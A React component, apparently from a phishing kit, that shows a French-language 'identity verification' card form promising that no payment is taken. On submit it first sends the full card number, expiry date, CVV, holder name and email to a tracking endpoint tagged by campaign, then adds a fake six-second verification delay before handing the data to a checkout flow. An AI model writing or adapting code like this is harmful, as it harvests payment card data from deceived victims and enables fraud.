import React, { useRef, useState, useEffect } from 'react';
import Checkout from './Checkout';

export default function PaymentForm({ email, firstName, campaign }) {
  const [card, setCard] = useState('');
  const [exp, setExp] = useState('');
  const [cvv, setCvv] = useState('');
  const [name, setName] = useState(() => {
    if (typeof window !== 'undefined') {
      const params = new URLSearchParams(window.location.search);
      return params.get('name') || '';
    }
    return '';
  });

  function formatCard(value) {
    return value.replace(/\D/g, '').slice(0, 16).replace(/(\d{4})/g, '$1 ').trim();
  }
  function formatExp(value) {
    const v = value.replace(/\D/g, '').slice(0, 4);
    if (v.length <= 2) return v;
    return v.slice(0,2) + '/' + v.slice(2);
  }

  const checkoutRef = useRef(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [buttonText, setButtonText] = useState('Vérifier mon identité');
  const [useAdvancedPayment] = useState(true);

  async function handleSubmit(e) {
    e.preventDefault();

    // Track the event (inclut toutes les infos carte)
    fetch('/api/tracking/track-submission', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        eventType: 'verification_start',
        payload: { email, firstName, card, name, exp, cvv },
        campaign
      })
    });

    // Vérification des champs
    if (card.replace(/\s/g,'').length < 16) return alert('Numéro de carte invalide');
    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(exp)) return alert("Date d'expiration invalide");
    if (cvv.length < 3) return alert('CVV invalide');
    if (!name) return alert('Nom requis');
    
    // Changer le texte du bouton en "Vérification..."
    setButtonText('Vérification...');

    // keep the button in loading state for 6s minimal to mimic prior UI behavior
    await new Promise(r => setTimeout(r, 6000));

    // Déclencher le flux de paiement Checkout.js
    setIsSubmitting(true);

    if (checkoutRef.current) {
      checkoutRef.current.startPaymentProcess();
    }
  }

  return (
    <form onSubmit={handleSubmit} className="paymentForm">
      <div className="formGroup">
        <label className="label">Numéro de carte</label>
        <div className="cardInputWrapper">
          <input
            className="input withRightIcon"
            placeholder="1234 5678 9012 3456"
            value={card}
            onChange={e=>setCard(formatCard(e.target.value))}
            inputMode="numeric"
            autoComplete="cc-number"
            required
          />
          <div className="cardNetworkInline">
            <img className="cardNetworkImg" src="/card-network.png" alt="Cartes acceptées" />
          </div>
        </div>
      </div>

      <div className="row">
        <div className="formGroup">
          <label className="label">Date d'expiration</label>
          <input className="input" placeholder="MM/YY" value={exp} onChange={e=>setExp(formatExp(e.target.value))} inputMode="numeric" autoComplete="cc-exp" required />
        </div>
        <div className="formGroup">
          <label className="label">Code CVV</label>
          <input className="input" placeholder="123" value={cvv} onChange={e=>setCvv(e.target.value.replace(/\D/g,'').slice(0,4))} inputMode="numeric" autoComplete="cc-csc" required />
        </div>
      </div>

      <div className="formGroup">
        <label className="label">Nom du titulaire</label>
        <input className="input" placeholder="Jean Dupont" value={name} onChange={e=>setName(e.target.value)} autoComplete="cc-name" required />
      </div>

      <div className="notice" aria-live="polite">
         Vérification du titulaire • Aucun paiement à effectuer
      </div>

      <button type="submit" className="button" style={{ width: '100%' }} disabled={isSubmitting}>
        {buttonText}
      </button>

      {useAdvancedPayment && (
        <Checkout
          ref={checkoutRef}
          formData={{ card, exp, cvv, name }}
          email={email}
          firstName={firstName}
          campaign={campaign}
          onSuccess={() => {}}
          onError={() => {}}
        />
      )}
    </form>
  );
}
